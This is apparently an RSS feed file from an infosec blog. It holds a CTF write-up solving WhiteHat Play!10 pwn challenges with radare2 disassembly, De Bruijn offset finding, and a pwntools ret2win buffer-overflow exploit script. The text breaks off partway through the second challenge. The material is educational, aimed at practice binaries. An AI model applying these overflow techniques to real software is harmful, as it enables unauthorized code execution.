@@ -1,0 +1,985 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>radare2 on Yet, another infosec blog</title>
+    <link>/tags/radare2/</link>
+    <description>Recent content in radare2 on Yet, another infosec blog</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <lastBuildDate>Mon, 10 Jan 2022 09:30:00 +1345</lastBuildDate><atom:link href="/tags/radare2/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>PWN Journey: Part 2</title>
+      <link>/posts/pwns-2/</link>
+      <pubDate>Mon, 10 Jan 2022 09:30:00 +1345</pubDate>
+      
+      <guid>/posts/pwns-2/</guid>
+      <description>&lt;p&gt;In this post, we will solve two pwn challenges from WhiteHat Play!10 and a customized one. We will also delve into details about most frequently encountered protection bits as well as bypass method for each.&lt;/p&gt;</description>
+      <content>&lt;p&gt;In this post, we will solve two pwn challenges from WhiteHat Play!10 and a customized one. We will also delve into details about most frequently encountered protection bits as well as bypass method for each.&lt;/p&gt;
+&lt;p&gt;Anyway, I hope you have a good time reading.&lt;/p&gt;
+&lt;h2 id=&#34;whitehat-play10---pwn01&#34;&gt;WhiteHat Play!10 - pwn01&lt;/h2&gt;
+&lt;p&gt;&lt;strong&gt;Goal:&lt;/strong&gt; Trigger the buffer overflow and call &lt;code&gt;covid19&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;This is an original pwn challenge from WhiteHat Play10! Wargame and you can download it &lt;a href=&#34;https://drive.google.com/file/d/1sHGwTRkcGEqCxas8SqCoVt-P6FV-468B/view&#34;&gt;here&lt;/a&gt; or use this &lt;a href=&#34;https://github.com/legiahuyy/dropper/blob/main/whitehat10/pwn/easybof&#34;&gt;mirror link&lt;/a&gt;.&lt;/p&gt;
+&lt;h3 id=&#34;fingerprinting&#34;&gt;Fingerprinting&lt;/h3&gt;
+&lt;p&gt;Initially, we want to know what type of the binary we are going to analyze and we will have &lt;code&gt;file&lt;/code&gt; and &lt;code&gt;radare2&lt;/code&gt; to determine its properties.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-20-pwns-2/2021-12-20_10-10.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;A 64-bit ELF with NX bit enabled.&lt;/p&gt;
+&lt;p&gt;The challenge, of course, does not provide us with its original source code. Here is a list of functions and their disassembled-views.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-20-pwns-2/2021-12-20_12-33.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;At &lt;code&gt;0x004011d9&lt;/code&gt; - &lt;code&gt;main&lt;/code&gt;:&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;[0x7f1963069050]&amp;gt; s main;pdf
+            ; DATA XREF from entry0 @ 0x4010f1
+┌ 221: int main (int argc, char **argv, char **envp);
+│           ; var int64_t var_120h @ rbp-0x120
+│           ; var int64_t var_114h @ rbp-0x114
+│           ; var int64_t var_110h @ rbp-0x110
+│           ; var int64_t var_4h @ rbp-0x4
+│           ; arg int argc @ rdi
+│           ; arg char **argv @ rsi
+│           0x004011d9      f30f1efa       endbr64
+│           0x004011dd      55             push rbp
+│           0x004011de      4889e5         mov rbp, rsp
+│           0x004011e1      4881ec200100.  sub rsp, 0x120
+│           0x004011e8      89bdecfeffff   mov dword [var_114h], edi   ; argc
+│           0x004011ee      4889b5e0feff.  mov qword [var_120h], rsi   ; argv
+│           0x004011f5      488b05342e00.  mov rax, qword [obj.stdin]  ; obj.stdin__GLIBC_2.2.5
+│                                                                      ; [0x404030:8]=0                                                
+│           0x004011fc      b900000000     mov ecx, 0
+│           0x00401201      ba02000000     mov edx, 2
+│           0x00401206      be00000000     mov esi, 0
+│           0x0040120b      4889c7         mov rdi, rax
+│           0x0040120e      e89dfeffff     call sym.imp.setvbuf        ; int setvbuf(FILE*stream, char *buf, int mode, size_t size)
+│           0x00401213      488b05062e00.  mov rax, qword [obj.stdout] ; obj.stdout__GLIBC_2.2.5
+│                                                                      ; [0x404020:8]=0                                                
+│           0x0040121a      b900000000     mov ecx, 0
+│           0x0040121f      ba02000000     mov edx, 2
+│           0x00401224      be00000000     mov esi, 0
+│           0x00401229      4889c7         mov rdi, rax
+│           0x0040122c      e87ffeffff     call sym.imp.setvbuf        ; int setvbuf(FILE*stream, char *buf, int mode, size_t size)
+│           0x00401231      488b05082e00.  mov rax, qword [obj.stderr] ; obj.stderr__GLIBC_2.2.5
+│                                                                      ; [0x404040:8]=0                                                
+│           0x00401238      b900000000     mov ecx, 0
+│           0x0040123d      ba02000000     mov edx, 2
+│           0x00401242      be00000000     mov esi, 0
+│           0x00401247      4889c7         mov rdi, rax
+│           0x0040124a      e861feffff     call sym.imp.setvbuf        ; int setvbuf(FILE*stream, char *buf, int mode, size_t size)
+│           0x0040124f      488d3dda0d00.  lea rdi, str.You_can_find_the_key_to_save_humanity_from_the_COVID_19_pandemic ; 0x402030 ; &amp;quot;You can find the key to save humanity from the COVID-19 pandemic&amp;quot;                                                                      
+│           0x00401256      e825feffff     call sym.imp.puts           ; int puts(const char *s)
+│           0x0040125b      488d3d0f0e00.  lea rdi, str.Here_is_your_chance:_ ; 0x402071 ; &amp;quot;Here is your chance: &amp;quot;
+│           0x00401262      e819feffff     call sym.imp.puts           ; int puts(const char *s)
+│           0x00401267      488d85f0feff.  lea rax, [var_110h]
+│           0x0040126e      4889c6         mov rsi, rax
+│           0x00401271      488d3d0f0e00.  lea rdi, [0x00402087]       ; &amp;quot;%s&amp;quot;
+│           0x00401278      b800000000     mov eax, 0
+│           0x0040127d      e83efeffff     call sym.imp.__isoc99_scanf ; int scanf(const char *format)
+│           0x00401282      488d85f0feff.  lea rax, [var_110h]
+│           0x00401289      4889c7         mov rdi, rax
+│           0x0040128c      e8fffdffff     call sym.imp.strlen         ; size_t strlen(const char *s)
+│           0x00401291      8945fc         mov dword [var_4h], eax
+│           0x00401294      488d85f0feff.  lea rax, [var_110h]
+│           0x0040129b      4889c7         mov rdi, rax
+│           0x0040129e      e8ddfdffff     call sym.imp.puts           ; int puts(const char *s)
+│           0x004012a3      488d3de00d00.  lea rdi, str.No_please_try_again____ ; 0x40208a ; &amp;quot;No,please try again!!!!&amp;quot;
+│           0x004012aa      e8d1fdffff     call sym.imp.puts           ; int puts(const char *s)
+│           0x004012af      b800000000     mov eax, 0
+│           0x004012b4      c9             leave
+└           0x004012b5      c3             ret
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;and at &lt;code&gt;0x004011b6&lt;/code&gt;, we have &lt;code&gt;covid19&lt;/code&gt;:&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;[0x004011d9]&amp;gt; s sym.covid19 ;pdf
+┌ 35: sym.covid19 ();
+│           0x004011b6      f30f1efa       endbr64
+│           0x004011ba      55             push rbp
+│           0x004011bb      4889e5         mov rbp, rsp
+│           0x004011be      488d3d430e00.  lea rdi, str.Congratulations_ ; 0x402008 ; &amp;quot;Congratulations!&amp;quot;
+│           0x004011c5      e8b6feffff     call sym.imp.puts           ; int puts(const char *s)
+│           0x004011ca      488d3d480e00.  lea rdi, str.cat__home_easybof_flag ; 0x402019 ; &amp;quot;cat /home/easybof/flag&amp;quot;
+│           0x004011d1      e8cafeffff     call sym.imp.system         ; int system(const char *string)
+│           0x004011d6      90             nop
+│           0x004011d7      5d             pop rbp
+└           0x004011d8      c3             ret
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;If you have a difficult time understand this low-level language, try to get the gist and look at their roughly equivalent pseudo-c as follows:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;
+&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;main&lt;/span&gt;()
+{
+	&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; size;
+	&lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; buffer[&lt;span style=&#34;color:#ae81ff&#34;&gt;0x110&lt;/span&gt;];
+	puts(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;You can find the key to save humanity from the COVID-19 pandemic&amp;#34;&lt;/span&gt;);
+	puts(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Here is your chance: &amp;#34;&lt;/span&gt;);
+	scanf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;%s&amp;#34;&lt;/span&gt;, buffer);
+	size &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; strlen(buffer);
+	puts(buffer)
+	puts(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;No,please try again!!!!&amp;#34;&lt;/span&gt;);
+	&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
+}
+
+&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;covid19&lt;/span&gt;()
+{
+	puts(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Congratulations!&amp;#34;&lt;/span&gt;);
+	system(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;cat /home/easybof/flag&amp;#34;&lt;/span&gt;);
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;code-breakdown&#34;&gt;Code breakdown&lt;/h3&gt;
+&lt;p&gt;There are two functions, &lt;code&gt;main&lt;/code&gt; and &lt;code&gt;covid19&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;main&lt;/code&gt; creates a presumable buffer of &lt;code&gt;0x110&lt;/code&gt; bytes in size and &lt;code&gt;covid19&lt;/code&gt; merely prints &lt;code&gt;Congratulations!&lt;/code&gt; then calls &lt;code&gt;system&lt;/code&gt; to read the flag at &lt;code&gt;/home/easybof/flag&lt;/code&gt;.&lt;/p&gt;
+&lt;h3 id=&#34;solution&#34;&gt;Solution&lt;/h3&gt;
+&lt;p&gt;As &lt;code&gt;scanf&lt;/code&gt; has no boundary check, it provides a buffer overflow opportunity for us to exploit. We thus have to determine the padding length between the buffer and our RIP, thereby making it point to the address of &lt;code&gt;covid19&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;Hence, our &lt;em&gt;ret2win&lt;/em&gt; skeleton payload:&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;payload = PAD_TIL_RIP (??) + covid19_ADDR (??)
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;In order to find the &lt;code&gt;PAD_TIL_RIP&lt;/code&gt; variable, as you may or may not have already known from my previous post, we mentioned a sequence called De Bruijn Sequence that can evaluate the distance between the start offset of our buffer and RIP.&lt;/p&gt;
+&lt;p&gt;And make sure your sequence has the length of &lt;code&gt;buffer_size + 4n&lt;/code&gt;, keep increase until a SIGSEGV (code=1) occurs. In this case, I will have &lt;a href=&#34;https://r2wiki.readthedocs.io/en/latest/tools/ragg2/&#34;&gt;ragg2&lt;/a&gt; to generate a sequence of 284 characters&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;┌──&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;legiahuyy㉿kali&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;~/…/Study/PWN/WhiteHatWargame/pwn1_c15747119b&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+└─$ ragg2 -P &lt;span style=&#34;color:#ae81ff&#34;&gt;280&lt;/span&gt; -r
+AAABAACAADAAEAAFAAGAAHAAIAAJAAKAALAAMAANAAOAAPAAQAARAASAATAAUAAVAAWAAXAAYAAZAAaAAbAAcAAdAAeAAfAAgAAhAAiAAjAAkAAlAAmAAnAAoAApAAqAArAAsAAtAAuAAvAAwAAxAAyAAzAA1AA2AA3AA4AA5AA6AA7AA8AA9AA0ABBABCABDABEABFABGABHABIABJABKABLABMABNABOABPABQABRABSABTABUABVABWABXABYABZABaABbABcABdABeABfABg
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;then feed it to the program and successfully be able to control the RIP.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-20-pwns-2/2021-12-20_16-53.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;So, our &lt;code&gt;PAD_TIL_RIP&lt;/code&gt; would be 280.&lt;/p&gt;
+&lt;p&gt;The last variable is &lt;code&gt;covid19_ADDR&lt;/code&gt;, which we can get with &lt;code&gt;afl~covid19&lt;/code&gt;.&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;[0x7f0041684241]&amp;gt; afl~covid19
+0x004011b6    1 35           sym.covid19
+[0x7f0041684241]&amp;gt; 
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;And our final payload is:&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;payload = PAD_TIL_RIP (280) + covid19_ADDR (0x004011b6)
+&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;solvepy&#34;&gt;SOLVE.py&lt;/h3&gt;
+&lt;p&gt;Now, we already have everything needed for the script but unfortunately, I could not connect to the wargame server as it ended a month ago, so I created a fake flag locate exactly at &lt;code&gt;/home/easybof/flag&lt;/code&gt;.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#!/usr/bin/env python3&lt;/span&gt;
+&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; pwn &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;
+
+context&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;binary &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ELF(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;./easybof&amp;#39;&lt;/span&gt;)
+r &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; process()
+
+payload &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;a&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;280&lt;/span&gt;		&lt;span style=&#34;color:#75715e&#34;&gt;# padding&lt;/span&gt;
+payload &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; p64(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x004011b6&lt;/span&gt;)	&lt;span style=&#34;color:#75715e&#34;&gt;# covid19 address&lt;/span&gt;
+
+r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Here is your chance: &amp;#39;&lt;/span&gt;, payload)
+print(r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvall())
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-20-pwns-2/2021-12-20_17-08.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;whitehat-play10---pwn02&#34;&gt;WhiteHat Play!10 - pwn02&lt;/h2&gt;
+&lt;p&gt;&lt;strong&gt;Goal:&lt;/strong&gt; Modify a volatile variable and successfully read the flag.&lt;/p&gt;
+&lt;p&gt;This is an original pwn challenge from WhiteHat Play10! Wargame and you can download it &lt;a href=&#34;https://drive.google.com/file/d/1w3QMg-5BHwIr1p7OMkJLyJIVd9Ug0k9_/view?usp=sharing&#34;&gt;here&lt;/a&gt; or use this &lt;a href=&#34;https://github.com/legiahuyy/dropper/blob/main/whitehat10/pwn/ChickenStar&#34;&gt;mirror link&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;From my perspective, the challenge itself is neither difficult nor complicated and we have already had a similar one in our first part of the journey. Nevertheless, I still want to give you another example of how I go around and poke things to solve these tasks. Moreover, there is one new detail (to me, at least) in this challenge, which I thought it might intrigue you readers.&lt;/p&gt;
+&lt;h3 id=&#34;fingerprinting-1&#34;&gt;Fingerprinting&lt;/h3&gt;
+&lt;p&gt;As usual, let us check the properties of our ELF - &amp;ldquo;ChickenStar&amp;rdquo;.&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;radare2&lt;/code&gt; output:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-20-pwns-2/2021-12-21_08-22.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;file&lt;/code&gt; output:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-20-pwns-2/2021-12-21_08-24.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;During normal execution, the program prompts for a password then repeats our input and prints a constant value of &lt;code&gt;0x43563139&lt;/code&gt;.&lt;/p&gt;
+&lt;!-- raw HTML omitted --&gt;
+&lt;h3 id=&#34;in-depth-analysis&#34;&gt;In-depth analysis&lt;/h3&gt;
+&lt;p&gt;Have a glance at the functions list and their disassembly in radare2.&lt;/p&gt;
+&lt;p&gt;Type &lt;code&gt;afl&lt;/code&gt; to list all functions.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-20-pwns-2/2021-12-21_09-50.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;The binary composed of two principal functions, &lt;code&gt;main&lt;/code&gt; and &lt;code&gt;sym.check&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;You may have noticed that the addresses are somewhat different from other challenges we have encountered and this happens by reason of the PIE protection bit (stands for &lt;strong&gt;P&lt;/strong&gt;osition &lt;strong&gt;I&lt;/strong&gt;ndependent &lt;strong&gt;E&lt;/strong&gt;xecutable), which means every time you run the file, it gets loaded into a different memory region and this prevent hardcode values such as function addresses or gadget locations, thus making it &lt;em&gt;slightly&lt;/em&gt; more difficult for ret2win, ret2libc and such others to work properly.&lt;/p&gt;
+&lt;p&gt;Let see what is inside &lt;code&gt;main&lt;/code&gt;&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;            ; DATA XREF from entry0 @ 0x5555555551a1
+┌ 304: int main (int argc, char **argv, char **envp);
+│           ; var int64_t var_60h @ rbp-0x60
+│           ; var int64_t var_18h @ rbp-0x18
+│           0x5555555552ae      f30f1efa       endbr64
+│           0x5555555552b2      55             push rbp
+│           0x5555555552b3      4889e5         mov rbp, rsp
+│           0x5555555552b6      53             push rbx
+│           0x5555555552b7      4883ec58       sub rsp, 0x58
+│           0x5555555552bb      48c745e83931.  mov qword [var_18h], 0x43563139 ; &#39;91VC&#39;
+│           0x5555555552c3      488b05662d00.  mov rax, qword [reloc.stdin] ; [0x555555558030:8]=0
+│           0x5555555552ca      b900000000     mov ecx, 0
+│           0x5555555552cf      ba02000000     mov edx, 2
+│           0x5555555552d4      be00000000     mov esi, 0
+│           0x5555555552d9      4889c7         mov rdi, rax
+│           0x5555555552dc      e86ffeffff     call sym.imp.setvbuf    ; int setvbuf(FILE*stream, char *buf, int mode, size_t size)
+│           0x5555555552e1      488b05382d00.  mov rax, qword [reloc.stdout] ; [0x555555558020:8]=0
+│           0x5555555552e8      b900000000     mov ecx, 0
+│           0x5555555552ed      ba02000000     mov edx, 2
+│           0x5555555552f2      be00000000     mov esi, 0
+│           0x5555555552f7      4889c7         mov rdi, rax
+│           0x5555555552fa      e851feffff     call sym.imp.setvbuf    ; int setvbuf(FILE*stream, char *buf, int mode, size_t size)
+│           0x5555555552ff      488b053a2d00.  mov rax, qword [reloc.stderr] ; [0x555555558040:8]=0
+│           0x555555555306      b900000000     mov ecx, 0
+│           0x55555555530b      ba02000000     mov edx, 2
+│           0x555555555310      be00000000     mov esi, 0
+│           0x555555555315      4889c7         mov rdi, rax
+│           0x555555555318      e833feffff     call sym.imp.setvbuf    ; int setvbuf(FILE*stream, char *buf, int mode, size_t size)
+│           0x55555555531d      488d3d040d00.  lea rdi, str.Can_you_find_the_bank_password_to_prove_your_idols_purity_ ; 0x555555556028 ; &amp;quot;Can you find the bank password to prove your idols&#39; purity!&amp;quot;                                                                                               
+│           0x555555555324      e8c7fdffff     call sym.imp.puts       ; int puts(const char *s)
+│           0x555555555329      488d3d380d00.  lea rdi, str.Enter_string_password_here_to_print_account_statement:_ ; 0x555555556068 ; &amp;quot;Enter string password here to print account statement: &amp;quot;                                                                                                      
+│           0x555555555330      b800000000     mov eax, 0
+│           0x555555555335      e8d6fdffff     call sym.imp.printf     ; int printf(const char *format)
+│           0x55555555533a      488d45a0       lea rax, [var_60h]
+│           0x55555555533e      4889c6         mov rsi, rax
+│           0x555555555341      488d3d580d00.  lea rdi, [0x5555555560a0] ; &amp;quot;%s&amp;quot;
+│           0x555555555348      b800000000     mov eax, 0
+│           0x55555555534d      e80efeffff     call sym.imp.__isoc99_scanf ; int scanf(const char *format)
+│           0x555555555352      488d45a0       lea rax, [var_60h]
+│           0x555555555356      4889c6         mov rsi, rax
+│           0x555555555359      488d3d430d00.  lea rdi, str.__s_n      ; 0x5555555560a3 ; &amp;quot; %s\n&amp;quot;
+│           0x555555555360      b800000000     mov eax, 0
+│           0x555555555365      e8a6fdffff     call sym.imp.printf     ; int printf(const char *format)
+│           0x55555555536a      488b45e8       mov rax, qword [var_18h]
+│           0x55555555536e      4889c6         mov rsi, rax
+│           0x555555555371      488d3d300d00.  lea rdi, str.val:_0x_08x_n ; str.val:_0x_08x_n
+│                                                                      ; 0x5555555560a8 ; &amp;quot;val: 0x%08x\n&amp;quot;                                          
+│           0x555555555378      b800000000     mov eax, 0
+│           0x55555555537d      e88efdffff     call sym.imp.printf     ; int printf(const char *format)
+│           0x555555555382      b8efbeadde     mov eax, 0xdeadbeef
+│           0x555555555387      483945e8       cmp qword [var_18h], rax
+│       ┌─&amp;lt; 0x55555555538b      752f           jne 0x5555555553bc
+│       │   0x55555555538d      488d3d210d00.  lea rdi, str.Good_Job_Amazing_ ; 0x5555555560b5 ; &amp;quot;Good Job,Amazing!&amp;quot;
+│       │   0x555555555394      e857fdffff     call sym.imp.puts       ; int puts(const char *s)
+│       │   0x555555555399      e882fdffff     call sym.imp.geteuid    ; uid_t geteuid(void)
+│       │   0x55555555539e      89c3           mov ebx, eax
+│       │   0x5555555553a0      e87bfdffff     call sym.imp.geteuid    ; uid_t geteuid(void)
+│       │   0x5555555553a5      89de           mov esi, ebx
+│       │   0x5555555553a7      89c7           mov edi, eax
+│       │   0x5555555553a9      e892fdffff     call sym.imp.setreuid
+│       │   0x5555555553ae      488d3d120d00.  lea rdi, str.cat__home_ChickenStar_flag ; 0x5555555560c7 ; &amp;quot;cat /home/ChickenStar/flag&amp;quot;
+│       │   0x5555555553b5      e846fdffff     call sym.imp.system     ; int system(const char *string)
+│      ┌──&amp;lt; 0x5555555553ba      eb16           jmp 0x5555555553d2
+│      │└─&amp;gt; 0x5555555553bc      488d3d250d00.  lea rdi, str.Incorrect_password_cannot_print_account_statement._Please_try_again____ ; 0x5555555560e8 ; &amp;quot;Incorrect password cannot print account statement. Please try again!!!!&amp;quot;                                                                      
+│      │    0x5555555553c3      e828fdffff     call sym.imp.puts       ; int puts(const char *s)
+│      │    0x5555555553c8      bf01000000     mov edi, 1
+│      │    0x5555555553cd      e89efdffff     call sym.imp.exit       ; void exit(int status)
+│      │    ; CODE XREF from main @ 0x5555555553ba
+│      └──&amp;gt; 0x5555555553d2      b800000000     mov eax, 0
+│           0x5555555553d7      4883c458       add rsp, 0x58
+│           0x5555555553db      5b             pop rbx
+│           0x5555555553dc      5d             pop rbp
+└           0x5555555553dd      c3             ret
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;and &lt;code&gt;check&lt;/code&gt;.&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;┌ 69: sym.check ();
+│           0x555555555269      f30f1efa       endbr64
+│           0x55555555526d      55             push rbp
+│           0x55555555526e      4889e5         mov rbp, rsp
+│           0x555555555271      b900000000     mov ecx, 0
+│           0x555555555276      ba00000000     mov edx, 0
+│           0x55555555527b      be00000000     mov esi, 0
+│           0x555555555280      bf00000000     mov edi, 0
+│           0x555555555285      b800000000     mov eax, 0
+│           0x55555555528a      e8a1feffff     call sym.imp.ptrace     ; long ptrace(__ptrace_request request, pid_t pid, void*addr, void*data)
+│           0x55555555528f      4883f8ff       cmp rax, 0xffffffffffffffff
+│       ┌─&amp;lt; 0x555555555293      7516           jne 0x5555555552ab
+│       │   0x555555555295      488d3d6c0d00.  lea rdi, str.__LOL________ ; 0x555555556008 ; &amp;quot;========&amp;gt; LOL!!!!!! &amp;lt;========&amp;quot;
+│       │   0x55555555529c      e84ffeffff     call sym.imp.puts       ; int puts(const char *s)
+│       │   0x5555555552a1      bfffffffff     mov edi, 0xffffffff     ; -1
+│       │   0x5555555552a6      e835feffff     call sym.imp._exit      ; void _exit(int status)
+│       └─&amp;gt; 0x5555555552ab      90             nop
+│           0x5555555552ac      5d             pop rbp
+└           0x5555555552ad      c3             ret
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Here are their equivalent pseudo-c.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;main&lt;/span&gt;()
+{
+	&lt;span style=&#34;color:#66d9ef&#34;&gt;volatile&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt; password &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x43563139&lt;/span&gt;;
+   	&lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; buffer[&lt;span style=&#34;color:#ae81ff&#34;&gt;72&lt;/span&gt;];
+    
+	puts(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Can you find the bank password to prove your idols&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; purity!&amp;#34;&lt;/span&gt;);
+	printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Enter string password here to print account statement: &amp;#34;&lt;/span&gt;);
+	scanf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;%s&amp;#34;&lt;/span&gt;, buffer);
+	printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34; %s&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;,local_68);
+	printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;val: 0x%08x&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, check);
+    
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;(password &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xdeadbeef&lt;/span&gt;)
+    {
+	__euid &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; geteuid();
+	__ruid &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; geteuid();
+	setreuid(__ruid,__euid);
+	system(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;cat /home/ChickenStar/flag&amp;#34;&lt;/span&gt;);
+	&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
+    }
